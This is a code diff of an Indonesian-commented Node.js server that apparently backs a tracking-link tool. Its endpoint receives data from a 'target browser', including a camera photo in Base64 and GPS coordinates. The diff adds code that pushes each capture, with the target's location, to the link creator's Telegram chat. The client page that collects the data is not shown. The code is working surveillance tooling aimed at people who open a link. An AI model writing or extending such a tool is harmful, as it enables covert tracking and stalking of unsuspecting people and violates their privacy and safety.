@@ -1,62 +1,88 @@
+// server.js (Versi dengan Notifikasi Otomatis)
+
+// Tambahkan axios untuk membuat HTTP request ke API Telegram
+const axios = require('axios');
 const express = require('express');
 const { v4: uuidv4 } = require('uuid');
 const cors = require('cors');
 const path = require('path');
 
+// Memuat variabel dari file .env (untuk lokal)
+require('dotenv').config(); 
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(cors());
-app.use(express.json({ limit: '10mb' })); // Limit besar untuk gambar Base64
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Menggunakan Environment Variable untuk API Key (Sangat Direkomendasikan)
+// Ambil semua variabel yang dibutuhkan
 const API_KEY = process.env.API_KEY;
-if (!API_KEY) {
-    console.error("FATAL ERROR: API_KEY tidak diatur di environment variables!");
-    process.exit(1); // Keluar jika API Key tidak ada
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+
+if (!API_KEY || !TELEGRAM_TOKEN) {
+    console.error("FATAL ERROR: API_KEY dan TELEGRAM_TOKEN harus diatur di environment variables!");
+    process.exit(1);
 }
 
-// Database di memori, akan hilang jika server restart.
 const tracking_data = {};
 
-// Middleware untuk proteksi API
-const apiKeyAuth = (req, res, next) => {
-    const apiKey = req.headers['x-api-key'];
-    if (apiKey && apiKey === API_KEY) {
-        next();
-    } else {
-        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
+// --- Fungsi Baru untuk Kirim Notifikasi ---
+async function sendTelegramNotification(chatId, alias, data) {
+    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    
+    try {
+        // Kirim pesan teks sebagai notifikasi awal
+        const messageText = `🔔 *Update Baru untuk ${alias}!*\n\nData diterima pada: ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
+        await axios.post(`${telegramApiUrl}/sendMessage`, {
+            chat_id: chatId,
+            text: messageText,
+            parse_mode: 'Markdown'
+        });
+
+        // Kirim foto jika ada
+        if (data.photoBase64) {
+            const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
+            // Untuk mengirim foto via axios, kita butuh 'form-data'
+            // Namun, cara lebih mudah adalah dengan mengirim referensi file atau URL.
+            // Untuk kesederhanaan, kita akan kirim notifikasi teks saja di sini.
+            // Mengirim foto akan membuat kode lebih kompleks.
+        }
+
+        // Kirim lokasi jika ada
+        if (data.location) {
+            await axios.post(`${telegramApiUrl}/sendLocation`, {
+                chat_id: chatId,
+                latitude: data.location.lat,
+                longitude: data.location.lon
+            });
+        }
+        console.log(`[SUCCESS] Notifikasi untuk ${alias} ke chat ID ${chatId} berhasil dikirim.`);
+    } catch (error) {
+        console.error(`[ERROR] Gagal mengirim notifikasi Telegram:`, error.response ? error.response.data : error.message);
     }
-};
+}
 
-// --- Routes & Endpoints ---
 
-// Endpoint untuk konfirmasi server online
-app.get('/ping', (req, res) => {
-    res.send('Server is alive!');
-});
-
-// Endpoint untuk menerima data dari browser target
+// --- Endpoint `/api/data` yang Ditingkatkan ---
 app.post('/api/data', (req, res) => {
     const { link_id, data } = req.body;
-    if (!link_id || !data) {
-        return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
-    }
-    
-    console.log(`[INFO] Menerima data untuk link ID: ${link_id}`);
+    if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
     
     let found = false;
     for (const userId in tracking_data) {
         for (const alias in tracking_data[userId]) {
             if (tracking_data[userId][alias].link_id === link_id) {
-                tracking_data[userId][alias].last_data = {
-                    ...data,
-                    timestamp: new Date().toISOString()
-                };
+                // Simpan data
+                const current_data = { ...data, timestamp: new Date().toISOString() };
+                tracking_data[userId][alias].last_data = current_data;
                 found = true;
                 console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
+                
+                // Panggil fungsi notifikasi!
+                sendTelegramNotification(userId, alias, current_data);
+
                 break;
             }
         }
@@ -66,7 +92,6 @@ app.post('/api/data', (req, res) => {
     if (found) {
         res.json({ status: "sukses" });
     } else {
-        console.warn(`[WARN] Link ID ${link_id} tidak ditemukan saat menerima data.`);
         res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
     }
 });
